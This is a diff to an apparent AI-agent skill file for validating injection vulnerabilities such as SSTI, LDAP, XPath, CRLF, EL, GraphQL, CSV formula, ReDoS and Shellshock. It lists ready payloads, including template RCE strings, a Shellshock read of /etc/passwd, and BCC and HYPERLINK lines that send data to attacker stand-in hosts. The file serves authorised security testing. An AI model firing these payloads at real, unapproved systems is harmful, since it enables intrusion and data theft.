@@ -1,483 +1,450 @@
 ---
 name: injection-testing
-description: Validate injection vulnerabilities including SQL, NoSQL, OS Command, LDAP, XPath, SSTI, and XSS. Test by sending crafted payloads to user-controlled input fields and observing application behavior. Use when testing CWE-89 (SQL Injection), CWE-78 (OS Command Injection), CWE-79 (XSS), CWE-90 (LDAP Injection), CWE-917 (Expression Language Injection), CWE-94 (Code Injection), CWE-643 (XPath Injection), or related injection findings.
+description: Validate miscellaneous injection vulnerabilities NOT covered by dedicated skills. Covers SSTI, LDAP, XPath, XQuery, CRLF/HTTP Header, Email Header, GraphQL, Expression Language (EL/OGNL), JSON/JavaScript eval injection, ORM/HQL, CSV/Formula, Regex (ReDoS), YAML config, and Shellshock-style injection. Use when testing CWE-1336 (SSTI), CWE-90 (LDAP), CWE-643 (XPath), CWE-652 (XQuery), CWE-93/CWE-113 (CRLF/Header), CWE-917 (EL), CWE-94/CWE-95 (Code/Eval injection), CWE-1333 (ReDoS), CWE-1236 (CSV/Formula), and related injection classes.
 allowed-tools: Read, Write, Bash
 ---
 
-# Injection Testing Skill
+# Injection Testing Skill (Miscellaneous)
 
 ## Purpose
-Validate injection vulnerabilities by sending crafted payloads to user-controlled inputs and observing:
-- **Response time differences** (time-based detection)
-- **Error messages** (error-based detection)
-- **Content changes** (boolean-based detection)
-- **Payload reflection** (XSS detection)
+Validate miscellaneous injection vulnerabilities by sending crafted payloads to user-controlled inputs and observing:
+- **Template evaluation** (SSTI)
+- **Query manipulation** (LDAP, XPath, XQuery, GraphQL, ORM/HQL)
+- **Header manipulation** (CRLF, HTTP Header, Email Header)
+- **Expression/code evaluation** (EL, OGNL, Spring EL, JavaScript eval)
+- **Resource exhaustion** (ReDoS)
+- **Formula execution** (CSV/Spreadsheet injection)
+- **Config manipulation** (YAML, Environment variables)
+
+## Scope Note
+
+**This skill covers injection types WITHOUT dedicated skills.**
+
+For the following, use the dedicated skills:
+- SQL Injection → `sql-injection-testing`
+- NoSQL Injection → `nosql-injection-testing`
+- Cross-Site Scripting (XSS) → `xss-testing`
+- XML External Entity (XXE) → `xxe-testing`
+- OS Command Injection → `command-injection-testing`
 
 ## Vulnerability Types Covered
 
-### 1. SQL Injection (CWE-89)
-Inject SQL syntax into queries via user input.
+### 1. Server-Side Template Injection - SSTI (CWE-1336)
+Inject template expressions that execute on server.
 
 **Detection Methods:**
-- **Time-based:** `' OR SLEEP(5)--` causes 5+ second delay (MySQL/PostgreSQL/MSSQL)
-- **Error-based:** `'` causes SQL syntax error in response
-- **Boolean-based:** `' OR '1'='1` vs `' OR '1'='2` different responses (recommended for SQLite)
+- **Math evaluation:** `{{7*7}}` returns `49` in response
+- **Engine fingerprinting:** Different payloads for Jinja2, Twig, Freemarker, Velocity, Pebble, Thymeleaf
 
-**Database-Specific Notes:**
+**Common Payloads by Engine:**
 
-| Database | Time-Based | Error-Based | Boolean-Based |
-|----------|------------|-------------|---------------|
-| MySQL | `SLEEP(5)` | ✓ | ✓ |
-| PostgreSQL | `pg_sleep(5)` | ✓ | ✓ |
-| MSSQL | `WAITFOR DELAY` | ✓ | ✓ |
-| **SQLite** | ❌ No SLEEP | ✓ `sqlite3.OperationalError` | ✓ **Recommended** |
+| Engine | Detection Payload | RCE Payload Example |
+|--------|-------------------|---------------------|
+| Jinja2 (Python) | `{{7*7}}` | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
+| Twig (PHP) | `{{7*7}}` | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
+| Freemarker (Java) | `${7*7}` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
+| Velocity (Java) | `#set($x=7*7)$x` | `#set($e="")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime"...` |
+| Thymeleaf (Java) | `${7*7}` | `${T(java.lang.Runtime).getRuntime().exec('id')}` |
+| Pebble (Java) | `{{7*7}}` | (Limited sandbox escape) |
+| Smarty (PHP) | `{7*7}` | `{system('id')}` |
+| ERB (Ruby) | `<%= 7*7 %>` | `<%= system('id') %>` |
 
-**SQLite Detection:** SQLite has no `SLEEP()` function. Use:
-- **Error-based:** Look for `sqlite3.OperationalError`, `near "...": syntax error`
-- **Boolean-based:** Compare `' OR '1'='1` (returns data) vs `' OR '1'='2` (no data)
-
-**Test Pattern:** Send payload in parameter, observe response time/content/errors
-**Expected if secure:** Input escaped/parameterized, no behavior change
-**Actual if vulnerable:** Delay, SQL error, or content change
-
-### 2. OS Command Injection (CWE-78)
-Execute system commands via user input.
-
-**Detection Methods:**
-- **Time-based:** `; sleep 5` or `| ping -c 5 127.0.0.1` causes delay
-- **Output-based:** `; echo INJECT_MARKER` appears in response
-- **Error-based:** Command errors in response
-
-**Test Pattern:** Inject command separator + command, observe response
-**Expected if secure:** Input sanitized, command not executed
-**Actual if vulnerable:** Delay, marker in output, or system errors
-
-### 3. NoSQL Injection (CWE-943)
-Manipulate NoSQL queries via operators or JSON payloads.
-
-**Detection Methods:**
-- **Operator injection:** `{"$gt": ""}` bypasses authentication
-- **Boolean-based:** `{"$ne": null}` vs `{"$eq": "invalid"}` different results
-
-**Test Pattern:** Send NoSQL operators in JSON body/params
-**Expected if secure:** Operators treated as literal strings
-**Actual if vulnerable:** Query behavior changes, auth bypass
-
-### 4. Cross-Site Scripting - XSS (CWE-79)
-Inject client-side scripts that execute in browser context.
-
-**Detection Methods:**
-- **Reflected:** `<script>alert(1)</script>` appears unescaped in response
-- **Attribute injection:** `" onmouseover="alert(1)` breaks out of attribute
-- **Event handlers:** `<img src=x onerror=alert(1)>` in response
-
-**Test Pattern:** Send script payloads, check if reflected without encoding
-**Expected if secure:** Input HTML-encoded (`&lt;script&gt;`)
-**Actual if vulnerable:** Raw `<script>` tags in response
-
-### 5. LDAP Injection (CWE-90)
+### 2. LDAP Injection (CWE-90)
 Manipulate LDAP queries via special characters.
 
 **Detection Methods:**
 - **Wildcard bypass:** `*` returns all entries
 - **Filter manipulation:** `)(cn=*)` modifies filter logic
+- **Boolean-based:** `)(|(password=*))` vs normal query
 
-**Test Pattern:** Inject LDAP special characters, observe query results
-**Expected if secure:** Characters escaped, normal results
-**Actual if vulnerable:** All records returned or filter bypassed
+**Test Payloads:**
+```
+*
+*)(&
+*)(|(&
+admin)(|(password=*))
+admin)(!(&(1=0
+*))%00
+```
 
-### 6. Server-Side Template Injection - SSTI (CWE-1336)
-Inject template expressions that execute on server.
-
-**Detection Methods:**
-- **Math evaluation:** `{{7*7}}` returns `49` in response
-- **Engine fingerprinting:** Different payloads for Jinja2, Twig, Freemarker
-
-**Common Payloads:**
-- Jinja2: `{{7*7}}`, `{{config}}`
-- Twig: `{{7*7}}`, `{{_self.env}}`
-- Freemarker: `${7*7}`, `<#assign x=7*7>${x}`
-
-### 7. Expression Language Injection (CWE-917)
-Inject EL expressions in Java-based frameworks.
-
-**Detection Methods:**
-- **Math evaluation:** `${7*7}` or `#{7*7}` returns `49`
-- **Object access:** `${applicationScope}` leaks data
-
-### 8. XPath Injection (CWE-643)
+### 3. XPath Injection (CWE-643)
 Manipulate XPath queries in XML-based applications.
 
 **Detection Methods:**
 - **Boolean-based:** `' or '1'='1` returns all nodes
 - **Error-based:** `'` causes XPath syntax error
+- **Union-style:** `' or count(//*)>0 or '1'='1`
+
+**Test Payloads:**
+```
+' or '1'='1
+' or ''='
+1 or 1=1
+'] | //user/*[contains(*,'
+' or count(//*)>0 or '1'='1
+```
+
+### 4. XQuery Injection (CWE-652)
+Manipulate XQuery expressions in XML databases.
+
+**Detection Methods:**
+- Similar to XPath; targets XQuery-capable systems (eXist-db, MarkLogic, BaseX)
+
+**Test Payloads:**
+```
+' or '1'='1
+') or ('1'='1
+for $x in doc("users.xml")//user return $x
+```
+
+### 5. CRLF / HTTP Header Injection (CWE-93, CWE-113)
+Inject carriage return/line feed to manipulate HTTP headers.
+
+**Detection Methods:**
+- **Response splitting:** `%0d%0aSet-Cookie:injected=value` adds header
+- **Header injection:** `%0d%0aX-Injected:header` appears in response headers
+- **Host header poisoning:** Manipulated Host header affects redirects/URLs
+
+**Test Payloads:**
+```
+%0d%0aInjected-Header:value
+%0d%0aSet-Cookie:session=hijacked
+%0d%0a%0d%0a<html>Injected Body</html>
+\r\nX-Injected:true
+```
+
+### 6. Email Header Injection (CWE-93)
+Inject headers into email messages via SMTP.
+
+**Detection Methods:**
+- **BCC injection:** `victim@test.com%0ABcc:attacker@evil.com` adds BCC
+- **Subject manipulation:** `%0ASubject:Spoofed` changes subject
+
+**Test Payloads:**
+```
+victim@test.com%0ABcc:attacker@evil.com
+victim@test.com\r\nBcc:attacker@evil.com
+test%0ACc:attacker@evil.com
+test\nSubject:INJECTED
+```
+
+### 7. Expression Language Injection (CWE-917)
+Inject EL expressions in Java-based frameworks (Spring, JSP, OGNL).
+
+**Detection Methods:**
+- **Math evaluation:** `${7*7}` or `#{7*7}` returns `49`
+- **Object access:** `${applicationScope}` leaks data
+
+**Test Payloads by Framework:**
+
+| Framework | Detection | Notes |
+|-----------|-----------|-------|
+| Spring EL | `${7*7}`, `#{7*7}` | Double resolution in older versions |
+| OGNL (Struts) | `%{7*7}`, `${7*7}` | Many CVEs (Struts2) |
+| JSP EL | `${7*7}`, `#{7*7}` | Standard Java EE |
+| MVEL | `${7*7}` | Used in some workflow engines |
+
+### 8. JSON/JavaScript Eval Injection (CWE-94, CWE-95)
+Inject JavaScript expressions into server-side evaluation contexts (Node.js or embedded JS engines) where user input is passed to `eval()`, `Function()`, `vm.runInNewContext`, or similar.
+
+**Detection Methods:**
+- **Math evaluation:** `7*7` returns `49` (computed, not echoed)
+- **Built-in evaluation:** `Math.imul(7,7)` returns `49`
+- **Structure evaluation:** `['a','b'].length` returns `2`
+
+**Test Payloads (detection-only):**
+```text
+7*7
+Math.imul(7,7)
+['a','b'].length
+JSON.stringify({a:1})
+```
+
+**Safety:** Treat any server-side JavaScript evaluation as high-risk; stop at detection-only payloads.
+
+### 9. GraphQL Injection (CWE-74, CWE-89 variant)
+Manipulate GraphQL queries for data exfiltration or DoS.
+
+**Detection Methods:**
+- **Introspection abuse:** `{__schema{types{name}}}` reveals schema
+- **Batching attacks:** Multiple queries in single request
+- **Nested query DoS:** Deep nesting causes resource exhaustion
+- **Field suggestion:** Error messages reveal valid fields
+
+**Test Payloads:**
+```graphql
+{__schema{queryType{name}}}
+{__schema{types{name,fields{name}}}}
+query{user(id:"1' OR '1'='1"){name}}
+{user(id:1){friends{friends{friends{name}}}}}
+```
+
+### 10. ORM/HQL Injection (CWE-89 variant, CWE-943)
+Inject into ORM queries beyond basic SQL (Hibernate HQL, JPA JPQL, Django ORM).
+
+**Detection Methods:**
+- **HQL-specific syntax:** `' and 1=1 --` in Hibernate
+- **JPQL injection:** Concatenated JPQL strings
+- **Django ORM:** `__` field lookup manipulation
+
+**Test Payloads:**
+```
+' or 1=1 --
+' and substring(username,1,1)='a
+admin' AND (SELECT COUNT(*) FROM User)>0 AND '1'='1
+```
+
+### 11. CSV/Formula Injection (CWE-1236)
+Inject spreadsheet formulas into exported CSV/Excel files.
+
+**Detection Methods:**
+- **Formula execution:** `=1+1` or `=cmd|'/C calc'!A0` in exported data
+- **DDE injection:** `=IMPORTXML(...)` data exfiltration
+
+**Test Payloads (detection only):**
+```
+=1+1
+=SUM(1,2)
++1+1
+-1+1
+@SUM(1+1)
+=cmd|'/C calc'!A0
+=HYPERLINK("http://attacker.com/?data="&A1)
+```
+
+**Note:** Test only in isolated environments; formulas can execute on user machines.
+
+### 12. Regex Injection / ReDoS (CWE-1333)
+Inject patterns causing catastrophic backtracking in regex engines.
+
+**Detection Methods:**
+- **Time-based:** Malicious pattern causes significant delay
+- **Resource exhaustion:** CPU spike from nested quantifiers
+
+**Test Payloads:**
+```
+(a+)+$
+((a+)+)+$
+(a|a)+$
+([a-zA-Z]+)*$
+(.*a){x}  (where x is large, e.g., 20)
+```
+
+**Target input for (a+)+$:** `aaaaaaaaaaaaaaaaaaaaaaaa!`
+
+### 13. YAML/Config Injection (CWE-502 related)
+Inject YAML constructs for config manipulation (non-deserialization scenarios).
+
+**Detection Methods:**
+- **Anchor abuse:** `*alias` references in YAML
+- **Merge key injection:** `<<:` merges dictionaries
+- **Multi-document:** `---` separates documents
+
+**Test Payloads:**
+```yaml
+key: !!python/object/apply:os.system ['id']
+<<: *dangerous_anchor
+admin: true
+---
+override: value
+```
+
+### 14. Shellshock/Environment Variable Injection (CWE-78 variant)
+Inject into environment variables processed by bash.
+
+**Detection Methods:**
+- **Function injection:** `() { :; }; echo VULNERABLE`
+- **CGI exploitation:** Via User-Agent, Referer headers to CGI scripts
+
+**Test Payloads:**
+```
+() { :; }; echo SHELLSHOCK
+() { :; }; /bin/sleep 5
+() { :;}; /bin/cat /etc/passwd
+```
 
 ## Prerequisites
 - Target application running and reachable
 - Identified injection points (parameters, headers, body fields)
-- VULNERABILITIES.json with suspected injection findings
+- VULNERABILITIES.json with suspected injection findings if provided
 
 ## Testing Methodology
 
 ### Phase 1: Identify Injection Points
 
-Before testing, analyze the vulnerability report and source code to identify:
-- **URL parameters:** `?id=123&name=test`
-- **POST body fields:** JSON, form data, XML
-- **HTTP headers:** User-Agent, Referer, X-Forwarded-For
-- **Cookies:** Session values, preferences
-- **Path segments:** `/api/users/{id}/profile`
+Analyze for potential injection vectors:
+- **URL parameters:** Query strings, path segments
+- **POST body:** JSON, form data, GraphQL queries
+- **HTTP headers:** User-Agent, Referer, X-Forwarded-For, Host, Cookie
+- **File exports:** CSV downloads, report generation
+- **Email functionality:** Contact forms, notification systems
+- **Template rendering:** User-controlled content in pages/emails
+- **Search/filter features:** Often use LDAP, XPath, or custom queries
 
-**Key insight:** Any user-controlled input that reaches a query/command is a potential injection point.
+### Phase 2: Establish Baseline
 
-### Phase 2: Select Payloads Based on CWE
-
-Map vulnerabilities to payload categories:
-
-| CWE | Vulnerability | Primary Detection | Payload Category |
-|-----|---------------|-------------------|------------------|
-| CWE-89 | SQL Injection | Time/Error/Boolean | SQLi payloads |
-| CWE-78 | OS Command Injection | Time/Output | Command payloads |
-| CWE-79 | XSS | Reflection | Script payloads |
-| CWE-90 | LDAP Injection | Boolean | LDAP payloads |
-| CWE-917 | EL Injection | Math evaluation | EL payloads |
-| CWE-643 | XPath Injection | Boolean/Error | XPath payloads |
-| CWE-94 | Code Injection | Execution | Code payloads |
-
-### Phase 3: Establish Baseline
-
-Send a normal request and record:
+Send normal request and record:
 - Response time (for time-based detection)
 - Response content/length (for boolean-based detection)
 - HTTP status code
+- Response headers (for header injection)
 
+### Phase 3: Execute Injection Tests
+
+**SSTI Test:**
 ```python
-# Baseline request
-baseline_start = time.time()
-baseline_response = requests.get(f"{target}/api/users?id=123")
-baseline_time = time.time() - baseline_start
-baseline_content = baseline_response.text
-baseline_status = baseline_response.status_code
-```
-
-### Phase 4: Execute Injection Tests
-
-**Universal Pattern:**
-```
-1. Send baseline request → Record time, content, status
-2. Send injection payload → Record time, content, status
-3. Compare results → Detect anomalies
-4. Classify based on detection type
-```
-
-#### SQL Injection Test
-
-```python
-# Time-based SQLi
-payload = "123' OR SLEEP(5)--"
-test_start = time.time()
-test_response = requests.get(f"{target}/api/users?id={payload}")
-test_time = time.time() - test_start
-
-if test_time > baseline_time + 4.5:  # 5 second delay detected
-    classification = "VALIDATED"
-    evidence = f"Time-based SQLi confirmed: {test_time:.2f}s delay"
-```
-
-```python
-# Error-based SQLi
-payload = "123'"
-test_response = requests.get(f"{target}/api/users?id={payload}")
-
-sql_errors = ["sql syntax", "mysql", "postgresql", "sqlite", "oracle", 
-              "unclosed quotation", "quoted string not properly terminated"]
-if any(err in test_response.text.lower() for err in sql_errors):
-    classification = "VALIDATED"
-    evidence = "Error-based SQLi: SQL error message in response"
-```
-
-```python
-# Boolean-based SQLi
-true_payload = "123' OR '1'='1"
-false_payload = "123' OR '1'='2"
-
-true_response = requests.get(f"{target}/api/users?id={true_payload}")
-false_response = requests.get(f"{target}/api/users?id={false_payload}")
-
-if len(true_response.text) != len(false_response.text):
-    classification = "VALIDATED"
-    evidence = f"Boolean-based SQLi: Content length differs ({len(true_response.text)} vs {len(false_response.text)})"
-```
-
-#### Command Injection Test
-
-```python
-# Time-based command injection
-payloads = [
-    "; sleep 5",
-    "| sleep 5",
-    "& ping -c 5 127.0.0.1",
-    "`sleep 5`",
-    "$(sleep 5)"
-]
-
+payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{7*7}"]
 for payload in payloads:
-    test_start = time.time()
-    test_response = requests.get(f"{target}/api/ping?host=127.0.0.1{payload}")
-    test_time = time.time() - test_start
-    
-    if test_time > baseline_time + 4.5:
-        classification = "VALIDATED"
-        evidence = f"Command injection via '{payload}': {test_time:.2f}s delay"
-        break
+    resp = get(f"/template?name={quote(payload)}")
+    if "49" in resp.text:
+        status = "VALIDATED"
+        engine = identify_engine(payload)
 ```
 
-#### XSS Test
-
+**LDAP Injection Test:**
 ```python
-# Reflected XSS
-payloads = [
-    "<script>alert(1)</script>",
-    "<img src=x onerror=alert(1)>",
-    "\" onmouseover=\"alert(1)",
-    "<svg onload=alert(1)>",
-    "javascript:alert(1)"
-]
+baseline = get("/search?user=john")
+test = get("/search?user=*")
+if len(test.text) > len(baseline.text) * 5:
+    status = "VALIDATED"  # Wildcard returned all users
+```
 
+**CRLF Injection Test:**
+```python
+payload = "test%0d%0aX-Injected:true"
+resp = get(f"/redirect?url={payload}")
+if "X-Injected" in resp.headers:
+    status = "VALIDATED"
+```
+
+**EL Injection Test:**
+```python
+payloads = ["${7*7}", "#{7*7}", "%{7*7}"]
 for payload in payloads:
-    test_response = requests.get(f"{target}/search?q={payload}")
-    
-    # Check if payload is reflected without encoding
-    if payload in test_response.text:
-        classification = "VALIDATED"
-        evidence = f"Reflected XSS: payload '{payload[:30]}...' in response"
-        break
-    
-    # Check for partial reflection (attribute context)
-    if "onerror=" in test_response.text or "onmouseover=" in test_response.text:
-        classification = "VALIDATED"
-        evidence = "XSS in attribute context"
-        break
+    resp = get(f"/page?input={quote(payload)}")
+    if "49" in resp.text:
+        status = "VALIDATED"
 ```
 
-#### SSTI Test
-
+**ReDoS Test:**
 ```python
-# Template injection detection
-payloads = {
-    "jinja2": ["{{7*7}}", "{{config}}"],
-    "twig": ["{{7*7}}", "{{_self.env}}"],
-    "freemarker": ["${7*7}", "<#assign x=7*7>${x}"]
-}
-
-for engine, engine_payloads in payloads.items():
-    for payload in engine_payloads:
-        test_response = requests.get(f"{target}/template?name={payload}")
-        
-        if "49" in test_response.text:  # 7*7 = 49
-            classification = "VALIDATED"
-            evidence = f"SSTI ({engine}): math expression evaluated"
-            break
+baseline_time = measure("/search?pattern=test")
+malicious_pattern = "(a+)+$"
+malicious_input = "a" * 30 + "!"
+test_time = measure(f"/search?pattern={quote(malicious_pattern)}&input={quote(malicious_input)}")
+if test_time > baseline_time + 5:
+    status = "VALIDATED"
 ```
 
-### Phase 5: Classification Logic
+### Phase 4: Classification Logic
 
-```python
-def classify_injection(detection_type, baseline, test_result):
-    if detection_type == "time":
-        delay = test_result["time"] - baseline["time"]
-        if delay >= 4.5:  # Expected 5s payload
-            return "VALIDATED", f"Time delay: {delay:.2f}s"
-        elif delay >= 2.0:
-            return "PARTIAL", f"Partial delay: {delay:.2f}s"
-        else:
-            return "FALSE_POSITIVE", "No significant delay"
-    
-    elif detection_type == "error":
-        if has_injection_errors(test_result["content"]):
-            return "VALIDATED", "Injection error in response"
-        else:
-            return "FALSE_POSITIVE", "No error indicators"
-    
-    elif detection_type == "boolean":
-        if test_result["true_length"] != test_result["false_length"]:
-            return "VALIDATED", "Content differs based on condition"
-        else:
-            return "FALSE_POSITIVE", "No content difference"
-    
-    elif detection_type == "reflection":
-        if payload_reflected_unencoded(test_result["content"]):
-            return "VALIDATED", "Payload reflected without encoding"
-        else:
-            return "FALSE_POSITIVE", "Payload properly encoded"
-    
-    else:
-        return "UNVALIDATED", "Unknown detection type"
-```
+| Status | Meaning |
+|--------|---------|
+| **VALIDATED** | Injection confirmed (eval, data leak, header added, delay) |
+| **FALSE_POSITIVE** | Input properly sanitized |
+| **PARTIAL** | Some indicators but not definitive |
+| **UNVALIDATED** | Blocked, error, or insufficient evidence |
 
-**Status Definitions:**
+### Phase 5: Capture Evidence
 
-| Status | Meaning | When to Use |
-|--------|---------|-------------|
-| **VALIDATED** | Injection confirmed | Payload executed (delay, error, content change, reflection) |
-| **FALSE_POSITIVE** | Input properly sanitized | No injection indicators detected |
-| **PARTIAL** | Inconclusive results | Some indicators present but not definitive |
-| **UNVALIDATED** | Test incomplete | Error, timeout, or ambiguous response |
+Capture minimal structured evidence (redact PII/secrets, truncate to 8KB, hash full response):
+- `status`, `injection_type`, `cwe`
+- Baseline request (url, method, status, response_time)
+- Test request (url, method, status, response details)
+- Payload used and detected indicator
 
-### Phase 6: Capture Evidence
-
-Capture minimal structured evidence with redaction:
-
-```json
-{
-  "status": "VALIDATED",
-  "injection_type": "sql_injection_time_based",
-  "cwe": "CWE-89",
-  "baseline": {
-    "url": "http://target.com/api/users?id=123",
-    "method": "GET",
-    "status": 200,
-    "response_time_seconds": 0.15,
-    "response_hash": "sha256:abc123..."
-  },
-  "test": {
-    "url": "http://target.com/api/users?id=123' OR SLEEP(5)--",
-    "method": "GET",
-    "status": 200,
-    "response_time_seconds": 5.23,
-    "response_hash": "sha256:def456..."
-  },
-  "evidence": "Time-based SQL injection: 5.08s delay with SLEEP(5) payload",
-  "payload_used": "123' OR SLEEP(5)--"
-}
-```
-
-**Evidence Fields:**
-
-| Field | Required | Description |
-|-------|----------|-------------|
-| `injection_type` | Yes | Specific injection variant detected |
-| `response_time_seconds` | For time-based | Response timing for delay detection |
-| `response_snippet` | For content-based | First 8KB, redacted |
-| `payload_used` | Yes | Exact payload that triggered vulnerability |
-| `response_hash` | Yes | SHA-256 hash of complete response |
-
-**Redaction Requirements:**
-Same as authorization testing - redact passwords, tokens, PII from response snippets.
-
-## Payload Safety Rules
-
-**Safe Payloads (Detection Only):**
-- Time delays: `SLEEP()`, `WAITFOR DELAY`, `pg_sleep()`
-- Math operations: `7*7`, string concatenation
-- Echo markers: `echo INJECTION_TEST_MARKER`
-- Ping localhost: `ping -c 5 127.0.0.1`
-
-**NEVER Use Destructive Payloads:**
-- ❌ `DROP TABLE`, `DELETE FROM`, `TRUNCATE`
-- ❌ `rm -rf`, `del /f`, `format`
-- ❌ `shutdown`, `reboot`
-- ❌ File write operations
-- ❌ Reverse shells or callback payloads
+### Phase 6: Safety Rules
+- Detection-only payloads (math evaluation, timing, markers)
+- NEVER execute destructive commands via SSTI/EL
+- Do not exfiltrate real data
+- CSV formula testing only in isolated environments
+- Respect rate limits; avoid causing DoS
 
 ## Output Guidelines
+- Keep responses concise (1-4 sentences)
+- Include endpoint, payload, detection method, and impact
 
-**CRITICAL: Keep responses concise (1-4 sentences)**
-
-**Format for VALIDATED:**
+**Validated examples:**
 ```
-[Injection type] on [endpoint] - [payload] triggered [detection method]. [Impact]. Evidence: [file_path]
-```
-
-**Format for FALSE_POSITIVE:**
-```
-Input properly sanitized on [endpoint] - [detection method] showed no injection indicators. Evidence: [file_path]
-```
-
-**Format for UNVALIDATED:**
-```
-Injection test incomplete on [endpoint] - [reason]. Evidence: [file_path]
+SSTI (Jinja2) on /greet - {{7*7}} evaluated to 49. RCE possible via template engine.
+LDAP injection on /search - wildcard returned 500+ users vs 1. Data exposure risk.
+CRLF injection on /redirect - X-Injected header added to response. Response splitting possible.
+EL injection on /page - ${7*7} evaluated in Spring EL context. Code execution risk.
+GraphQL introspection on /graphql - schema exposed via __schema query. API structure revealed.
 ```
 
-**Examples:**
-
-**SQL Injection (time-based):**
+**Unvalidated example:**
 ```
-SQL injection on /api/users - SLEEP(5) payload caused 5.2s delay. Database query manipulation possible.
-```
-
-**Command Injection:**
-```
-OS command injection on /api/ping - sleep payload caused 5.1s delay. Remote code execution possible.
-```
-
-**XSS:**
-```
-Reflected XSS on /search - <script> tag reflected unencoded. Session hijacking risk.
+SSTI test incomplete on /template - all payloads returned literal text. Evidence: path/to/evidence.json
 ```
 
 ## CWE Mapping
 
-This skill validates injection vulnerabilities from OWASP A03:2021:
-- **CWE-89:** SQL Injection
-- **CWE-78:** OS Command Injection
-- **CWE-79:** Cross-site Scripting (XSS)
-- **CWE-90:** LDAP Injection
-- **CWE-91:** XML Injection
-- **CWE-94:** Code Injection
-- **CWE-95:** Eval Injection
-- **CWE-917:** Expression Language Injection
-- **CWE-643:** XPath Injection
-- **CWE-652:** XQuery Injection
-- **CWE-77:** Command Injection (generic)
-- **CWE-74:** Injection (parent category)
+**Primary CWEs (DAST-testable):**
+- **CWE-1336:** Improper Neutralization of Special Elements Used in a Template Engine (SSTI)
+- **CWE-90:** Improper Neutralization of Special Elements used in an LDAP Query (LDAP Injection)
+- **CWE-643:** Improper Neutralization of Data within XPath Expressions (XPath Injection)
+- **CWE-652:** Improper Neutralization of Data within XQuery Expressions (XQuery Injection)
+- **CWE-93:** Improper Neutralization of CRLF Sequences (CRLF Injection)
+- **CWE-113:** Improper Neutralization of CRLF Sequences in HTTP Headers (HTTP Response Splitting)
+- **CWE-644:** Improper Neutralization of HTTP Headers for Scripting Syntax
+- **CWE-917:** Improper Neutralization of Special Elements used in an Expression Language Statement (EL Injection)
+- **CWE-1333:** Inefficient Regular Expression Complexity (ReDoS)
+- **CWE-1236:** Improper Neutralization of Formula Elements in a CSV File (CSV/Formula Injection)
+- **CWE-94:** Improper Control of Generation of Code (Code Injection)
+- **CWE-95:** Improper Neutralization of Directives in Dynamically Evaluated Code (Eval Injection)
 
-See `examples.md` for comprehensive CWE list.
+**Additional CWEs commonly implicated by covered techniques:**
+- **CWE-200:** Exposure of Sensitive Information to an Unauthorized Actor (GraphQL introspection / verbose errors)
+- **CWE-400:** Uncontrolled Resource Consumption (GraphQL depth/batching and ReDoS impact)
+- **CWE-502:** Deserialization of Untrusted Data (unsafe YAML object deserialization)
+- **CWE-78:** OS Command Injection (Shellshock-style environment variable injection)
+- **CWE-89:** SQL Injection (ORM/HQL and GraphQL arguments reaching SQL sinks)
+- **CWE-564:** SQL Injection: Hibernate (HQL/JPQL variants)
+- **CWE-943:** Improper Neutralization of Special Elements in Data Query Logic (query-language injection class)
 
-## Safety Rules
+**Related/Parent CWEs:**
+- **CWE-74:** Improper Neutralization of Special Elements in Output Used by a Downstream Component (Injection - parent)
+- **CWE-96:** Improper Neutralization of Directives in Statically Saved Code (Static Code Injection)
+- **CWE-97:** Improper Neutralization of Server-Side Includes (SSI Injection)
+- **CWE-99:** Improper Control of Resource Identifiers (Resource Injection)
+- **CWE-116:** Improper Encoding or Escaping of Output
+- **CWE-20:** Improper Input Validation
 
-**Skill Responsibilities:**
-- ONLY test against --target-url provided by user
-- Use detection-only payloads (delays, markers, math)
-- NEVER send destructive payloads
-- Redact sensitive data from all evidence
-- Log all test actions
+**Related Attack Patterns:**
+- **CAPEC-250:** XML Injection
+- **CAPEC-136:** LDAP Injection
+- **CAPEC-83:** XPath Injection
+- **CAPEC-34:** HTTP Response Splitting
+- **CAPEC-105:** HTTP Request Splitting
+- **CAPEC-15:** Command Delimiters
+- **CAPEC-468:** Generic Cross-Browser Cross-Domain Theft
 
-**Scanner Responsibilities (handled at infrastructure level):**
-- Production URL detection
-- User confirmation prompts
-- Target reachability checks
+## Notable CVEs (examples)
+- **CVE-2025-66438 (Frappe ERPNext):** SSTI via Print Format rendering (CVSS 9.8).
+- **CVE-2023-22527 (Atlassian Confluence):** OGNL injection leading to RCE.
+- **CVE-2022-22965 (Spring4Shell):** Spring EL injection via data binding.
+- **CVE-2021-44228 (Log4Shell):** JNDI lookup injection (related to EL concepts).
+- **CVE-2020-17530 (Apache Struts):** OGNL injection via tag attributes.
+- **CVE-2019-11358 (jQuery):** Prototype pollution (related injection pattern).
+- **CVE-2017-9805 (Apache Struts):** REST plugin XStream RCE.
 
-## Error Handling
-- Target unreachable → Mark UNVALIDATED with connection error
-- Timeout during test → Mark UNVALIDATED with timeout reason
-- WAF/rate limiting → Mark UNVALIDATED, note blocking
-- Unexpected error → Log error, continue with next vulnerability
-
-## Examples
-
-For comprehensive injection-specific examples with payloads and evidence, see `examples.md`:
-- **SQL Injection:** Time-based, error-based, boolean-based, UNION-based
-- **Command Injection:** Linux/Windows variants, different separators
-- **XSS:** Reflected, DOM, stored, attribute context
-- **NoSQL Injection:** MongoDB operator injection
-- **SSTI:** Jinja2, Twig, Freemarker detection
-- **Test Result Types:** FALSE_POSITIVE, UNVALIDATED, PARTIAL scenarios
+## Safety Reminders
+- ONLY test against user-approved targets
+- Use detection-only payloads (math eval, timing, markers)
+- NEVER execute destructive commands via SSTI/EL
+- Do not exfiltrate real data
+- CSV formula testing only in isolated environments
+- Stop if production protections trigger
 
 ## Reference Implementations
-
-See `reference/` directory for implementation examples:
-- **`injection_payloads.py`**: Payload generation utilities by injection type
-- **`validate_injection.py`**: Complete injection testing with detection and classification
-- **`README.md`**: Usage guidance and adaptation notes
-
-These are reference implementations to adapt — not drop-in scripts. Each application requires tailored logic.
+- See `reference/injection_payloads.py` for payload generators by injection type
+- See `reference/validate_injection.py` for injection validation flow
+- See `examples.md` for concrete scenarios and evidence formats
 
 ### Additional Resources
-
-- [OWASP A05:2025-Injection](https://owasp.org/Top10/2025/A05_2025-Injection/) (latest)
-- [OWASP A03:2021-Injection](https://owasp.org/Top10/2021/A03_2021-Injection/)
-- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
